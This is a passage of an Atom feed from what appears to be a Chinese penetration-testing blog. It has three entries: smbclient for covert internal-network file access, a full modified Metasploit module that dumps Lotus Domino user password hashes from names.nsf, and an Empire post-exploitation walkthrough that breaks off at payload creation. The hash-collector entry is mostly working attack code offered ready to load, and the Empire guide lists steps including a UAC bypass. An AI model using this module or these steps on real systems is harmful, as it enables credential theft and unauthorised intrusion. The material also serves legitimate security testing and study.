<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.marksec.org/"/>
  <updated>2019-04-10T14:00:15.749Z</updated>
  <id>https://www.marksec.org/</id>
  
  <author>
    <name>mark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透之smbclient工具学习</title>
    <link href="https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/</id>
    <published>2019-04-10T10:13:00.000Z</published>
    <updated>2019-04-10T14:00:15.749Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  最近在渗透中通过代理带入工具发现使用代理反弹rdesktop进行文件查看太过于麻烦，利用metasploit等回连反弹shell也不是特别方便，最近发现使用smbclient进行代理进入内网，通过smb进行磁盘挂载查看，在速度和隐蔽性上都比较的不错。<br></blockquote><p><strong>smbclient命令</strong>属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。</p><a id="more"></a><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient(选项)(参数)</span><br></pre></td></tr></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；</span><br><span class="line">-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；</span><br><span class="line">-E：将信息送到标准错误输出设备；</span><br><span class="line">-h：显示帮助；</span><br><span class="line">-i&lt;范围&gt;：设置NetBIOS名称范围；</span><br><span class="line">-I&lt;IP地址&gt;：指定服务器的IP地址；</span><br><span class="line">-l&lt;记录文件&gt;：指定记录文件的名称；</span><br><span class="line">-L：显示服务器端所分享出来的所有资源；</span><br><span class="line">-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；</span><br><span class="line">-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；</span><br><span class="line">-N：不用询问密码；</span><br><span class="line">-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；</span><br><span class="line">-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；</span><br><span class="line">-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；</span><br><span class="line">-s&lt;目录&gt;：指定smb.conf所在的目录；</span><br><span class="line">-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；</span><br><span class="line">-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；</span><br><span class="line">-U&lt;用户名称&gt;：指定用户名称；</span><br><span class="line">-w&lt;工作群组&gt;：指定工作群组名称。</span><br><span class="line">-C：直接一次性使用smbclient命令</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">列出某个IP地址所提供的共享文件夹</span><br><span class="line">smbclient -L 198.168.0.1 -U username%password</span><br><span class="line"></span><br><span class="line">像ftp客户端一样使用smbclient</span><br><span class="line">smbclient //192.168.0.1/tmp  -U username%password</span><br><span class="line">执行smbclient命令成功后，进入smbclient环境，出现提示符：smb:/&gt;</span><br><span class="line"></span><br><span class="line">直接一次性使用smbclient命令</span><br><span class="line">smbclient -c &quot;ls&quot;  //192.168.0.1/tmp  -U username%password</span><br><span class="line"></span><br><span class="line">注意：在进行smb:/&gt;之后想上传下载文件不能使用绝对路径，相对路径即可</span><br></pre></td></tr></table></figure><h3 id="远程挂载"><a href="#远程挂载" class="headerlink" title="远程挂载"></a>远程挂载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用mount命令可以将目标主机的目录挂在到linux的指定目录下进行操作，此处需要注意权限问题</span><br><span class="line">sudo mount -t cifs -o username=username,file_mode=0777,dir_mode=0777 //192.168.0.1/temp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  最近在渗透中通过代理带入工具发现使用代理反弹rdesktop进行文件查看太过于麻烦，利用metasploit等回连反弹shell也不是特别方便，最近发现使用smbclient进行代理进入内网，通过smb进行磁盘挂载查看，在速度和隐蔽性上都比较的不错。&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;smbclient命令&lt;/strong&gt;属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于metasploit模块lotus版本大于9.0的修改</title>
    <link href="https://www.marksec.org/2019/04/04/lotus%E6%A8%A1%E5%9D%97%E4%BF%AE%E6%94%B9/"/>
    <id>https://www.marksec.org/2019/04/04/lotus模块修改/</id>
    <published>2019-04-04T08:13:00.000Z</published>
    <updated>2019-04-10T13:36:47.098Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote><br>  最近在工作中遇到了lotus的邮件系统，但在对于lotus的研究中发现，在使用metastploit的auxiliary/scanner/lotus/lotus_domino_hashes的时候，出现了报错，在显示了第一行的用户名和密码后，就直接报错了，在查询资料了解到lotus&gt;=9.0，登陆功能发生了变化，无法使用。<br></blockquote><br><a id="more"></a><br>metasploit的中的lotus用户名密码导出模块auxiliary/scanner/lotus/lotus_domino_hashes的两处修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一处：       </span><br><span class="line">       res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">         &apos;uri&apos;     =&gt; &quot;#&#123;$uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">第二处：</span><br><span class="line">          :source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure><p>修改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一处：        </span><br><span class="line">        res = send_request_cgi(&#123;</span><br><span class="line">          &apos;uri&apos;     =&gt; &apos;/names.nsf/$defaultview?Readviewentries&apos;,</span><br><span class="line">第二处：</span><br><span class="line">           #:source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure><p>修改完的完整rb脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class="line">  include Msf::Exploit::Remote::HttpClient</span><br><span class="line">  include Msf::Auxiliary::Report</span><br><span class="line">  include Msf::Auxiliary::Scanner</span><br><span class="line"></span><br><span class="line">  def initialize</span><br><span class="line">    super(</span><br><span class="line">      &apos;Name&apos;           =&gt; &apos;Lotus Domino Password Hash Collector&apos;,</span><br><span class="line">      &apos;Description&apos;    =&gt; &apos;Get users passwords hashes from names.nsf page&apos;,</span><br><span class="line">      &apos;Author&apos;         =&gt; &apos;Tiago Ferreira &lt;tiago.ccna[at]gmail.com&gt;&apos;,</span><br><span class="line">      &apos;License&apos;        =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;References&apos;     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [&apos;CVE&apos; , &apos;2007-0977&apos;]</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  register_options(</span><br><span class="line">    [</span><br><span class="line">      OptString.new(&apos;NOTES_USER&apos;, [false, &apos;The username to authenticate as&apos;, &apos;&apos;]),</span><br><span class="line">      OptString.new(&apos;NOTES_PASS&apos;, [false, &apos;The password for the specified username&apos; ]),</span><br><span class="line">      OptString.new(&apos;URI&apos;, [false, &apos;Define the path to the names.nsf file&apos;, &apos;/names.nsf&apos;])</span><br><span class="line">    ])</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def post_auth?</span><br><span class="line">    true</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def run_host(ip)</span><br><span class="line">    user = datastore[&apos;NOTES_USER&apos;]</span><br><span class="line">    pass = datastore[&apos;NOTES_PASS&apos;]</span><br><span class="line">    @uri = normalize_uri(datastore[&apos;URI&apos;])</span><br><span class="line"></span><br><span class="line">    if user.eql?(&apos;&apos;) &amp;&amp; pass.eql?(&apos;&apos;)</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes without credentials&quot;)</span><br><span class="line"></span><br><span class="line">      begin</span><br><span class="line">        res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">          &apos;uri&apos;     =&gt; &quot;#&#123;@uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &#125;, 25)</span><br><span class="line"></span><br><span class="line">        if res.nil?</span><br><span class="line">          print_error(&apos;Connection failed&apos;)</span><br><span class="line">          return</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if res &amp;&amp; res.body.to_s =~ /\&lt;viewentries/</span><br><span class="line">          print_good(&quot;#&#123;peer&#125; - Lotus Domino - OK names.nsf accessible without credentials&quot;)</span><br><span class="line">          cookie = &apos;&apos;</span><br><span class="line">          get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">        elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - The remote server requires authentication&quot;)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">          vprint_error(res.to_s)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">      rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes with given credentials&quot;)</span><br><span class="line">      do_login(user, pass)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def do_login(user = nil, pass = nil)</span><br><span class="line">    post_data = &quot;username=#&#123;Rex::Text.uri_encode(user.to_s)&#125;&amp;password=#&#123;Rex::Text.uri_encode(pass.to_s)&#125;&amp;RedirectTo=%2Fnames.nsf&quot;</span><br><span class="line"></span><br><span class="line">    begin</span><br><span class="line"></span><br><span class="line">      res = send_request_cgi(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &apos;/names.nsf?Login&apos;,</span><br><span class="line">        &apos;data&apos;    =&gt; post_data</span><br><span class="line">      &#125;, 20)</span><br><span class="line"></span><br><span class="line">      if res.nil?</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Connection timed out&quot;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.code == 302</span><br><span class="line">        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;DomAuthSessId=#&#123;$1&#125;&quot;</span><br><span class="line">        elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;LtpaToken=#&#123;$1&#125;&quot;</span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized 302 response&quot;)</span><br><span class="line">          return :abort</span><br><span class="line">        end</span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - SUCCESSFUL authentication for &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        print_status(&quot;#&#123;peer&#125; - Lotus Domino - Getting password hashes&quot;)</span><br><span class="line">        get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">      elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Authentication error: failed to login as &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        return :abort</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">        return :abort</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def get_views(cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        max = res.body.scan(/siblings=\&quot;(.*)\&quot;/).first.join</span><br><span class="line"></span><br><span class="line">        1.upto(max.to_i) do |i|</span><br><span class="line">          res = send_request_raw(&#123;</span><br><span class="line">            &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">            &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&amp;Start=#&#123;i&#125;&quot;,</span><br><span class="line">            &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">          &#125;, 25)</span><br><span class="line"></span><br><span class="line">          view_id = res.body.scan(/unid=&quot;([^\s]+)&quot;/)[0].join</span><br><span class="line">          dump_hashes(view_id, cookie, uri)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def dump_hashes(view_id, cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview/#&#123;view_id&#125;?OpenDocument&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        short_name = res.body.scan(/&lt;INPUT NAME=\&quot;ShortName\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        user_mail = res.body.scan(/&lt;INPUT NAME=\&quot;InternetAddress\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        pass_hash = res.body.scan(/&lt;INPUT NAME=\&quot;\$?dspHTTPPassword\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line"></span><br><span class="line">        short_name = &apos;NULL&apos; if short_name.to_s.strip.empty?</span><br><span class="line">        user_mail = &apos;NULL&apos; if user_mail.to_s.strip.empty?</span><br><span class="line">        pass_hash = &apos;NULL&apos; if pass_hash.to_s.strip.empty?</span><br><span class="line"></span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - Account Found: #&#123;short_name&#125;, #&#123;user_mail&#125;, #&#123;pass_hash&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if pass_hash != &apos;NULL&apos;</span><br><span class="line">          domino_svc = report_service(</span><br><span class="line">            :host =&gt; rhost,</span><br><span class="line">            :port =&gt; rport,</span><br><span class="line">            :name =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;)</span><br><span class="line">          )</span><br><span class="line">          report_auth_info(</span><br><span class="line">            :host        =&gt; rhost,</span><br><span class="line">            :port        =&gt; rport,</span><br><span class="line">            :sname       =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;),</span><br><span class="line">            :user        =&gt; short_name,</span><br><span class="line">            :pass        =&gt; pass_hash,</span><br><span class="line">            :ptype       =&gt; &apos;domino_hash&apos;,</span><br><span class="line">            :source_id   =&gt; domino_svc.id,</span><br><span class="line">            :source_type =&gt; &apos;service&apos;,</span><br><span class="line">            :proof       =&gt; &quot;WEBAPP=\&quot;Lotus Domino\&quot;, USER_MAIL=#&#123;user_mail&#125;, HASH=#&#123;pass_hash&#125;, VHOST=#&#123;vhost&#125;&quot;,</span><br><span class="line">            :active      =&gt; true</span><br><span class="line">          )</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>将该模块复制进metasploit，出现启动载入模块，即可使用</p><p>参考链接：<a href="https://github.com/rapid7/metasploit-framework/issues/8278" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/issues/8278</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote&gt;&lt;br&gt;  最近在工作中遇到了lotus的邮件系统，但在对于lotus的研究中发现，在使用metastploit的auxiliary/scanner/lotus/lotus_domino_hashes的时候，出现了报错，在显示了第一行的用户名和密码后，就直接报错了，在查询资料了解到lotus&amp;gt;=9.0，登陆功能发生了变化，无法使用。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="metasploit" scheme="https://www.marksec.org/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Empire学习指南</title>
    <link href="https://www.marksec.org/2018/12/06/Empire%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
    <id>https://www.marksec.org/2018/12/06/Empire学习指南/</id>
    <published>2018-12-06T08:13:00.000Z</published>
    <updated>2019-03-24T05:26:06.686Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>empire是一款基于python编写的，使用powershell进行后渗透的工具，它类似于metasploit的渗透测试框架，empire可以实现无需powershell.exe即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。目前empire的版本号为empire2.5</p></blockquote><h2 id="安装启动"><a href="#安装启动" class="headerlink" title="安装启动"></a>安装启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git    </span><br><span class="line">cd Empire/</span><br><span class="line">cd setup/</span><br><span class="line">./install.sh </span><br><span class="line">./empire</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h2><p>empire主要的只要功能模块为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(Empire) &gt; help</span><br><span class="line"></span><br><span class="line">Commands</span><br><span class="line">========</span><br><span class="line">agents            Jump to the Agents menu.                           回连靶机</span><br><span class="line">creds             Add/display credentials to/from the database.      数据库中写入的各类凭据（主要为口令一类）</span><br><span class="line">exit              Exit Empire</span><br><span class="line">help              Displays the help menu.</span><br><span class="line">interact          Interact with a particular agent.                  与现有agents进行交互</span><br><span class="line">list              Lists active agents or listeners.                  列出当前活跃的监听器或服务端</span><br><span class="line">listeners         Interact with active listeners.                    进入监听器设置接口</span><br><span class="line">load              Loads Empire modules from a non-standard folder.   加载自定义模块或其他扩展模块接口（默认为empire当前目录）</span><br><span class="line">plugin            Load a plugin file to extend Empire.               加载自定义插件或其他扩展插件</span><br><span class="line">plugins           List all available and active plugins.             列出所有载入的插件列表</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files        预混淆功能</span><br><span class="line">reload            Reload one (or all) Empire modules.                同MSFreload功能</span><br><span class="line">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log    输出报告</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).        重置ip黑白名单、混淆项目等</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.  批量导入empire命令执行</span><br><span class="line">searchmodule      Search Empire module names/descriptions.           模块关键词搜索</span><br><span class="line">set               Set a global option (e.g. IP whitelists).          设置ip黑白名单、混淆项目等</span><br><span class="line">show              Show a global option (e.g. IP whitelists).         查看当前框架设置，也就是set默认值</span><br><span class="line">usemodule         Use an Empire module.                              使用某一模块</span><br><span class="line">usestager         Use an Empire stager.                              使用某一载荷</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建listener</span><br><span class="line">启用listener</span><br><span class="line">使用launcher启动一个powershell</span><br><span class="line">在目标靶机上执行代码</span><br><span class="line">与代理交互</span><br><span class="line">执行多种模块</span><br><span class="line">绕过UAC来获取admin权限</span><br></pre></td></tr></table></figure><p>首先输入listener进入listener交互模式，然后输入uselistener+空格再按tab键就可以使用你想生成的连接方式，然后再进行监听的基本设置就可以完成了。当我们想删除直接使用kill+Name就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(Empire) &gt; listeners</span><br><span class="line">(Empire: listeners) &gt; uselistener </span><br><span class="line">dbx           http_com      http_hop      meterpreter   redirector</span><br><span class="line">http          http_foreign  http_mapi     onedrive </span><br><span class="line">(Empire: listeners) &gt; uselistener http   //设置为http</span><br><span class="line">(Empire: listeners/http) &gt; info          //查看设置详情</span><br><span class="line">(Empire: listeners/http) &gt; set Name test //设置名字 </span><br><span class="line">(Empire: listeners/http) &gt; execute       //启动</span><br><span class="line">(Empire: listeners/http) &gt; back          //返回</span><br><span class="line">(Empire: listeners) &gt; list               //列出当前的监听列表</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</span><br><span class="line">  ----              ------          ----                                 ------------   --------</span><br><span class="line">  test              http            http://192.168.199.124:80            5/0.0</span><br></pre></td></tr></table></figure><p>接着我们进行木马的制作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 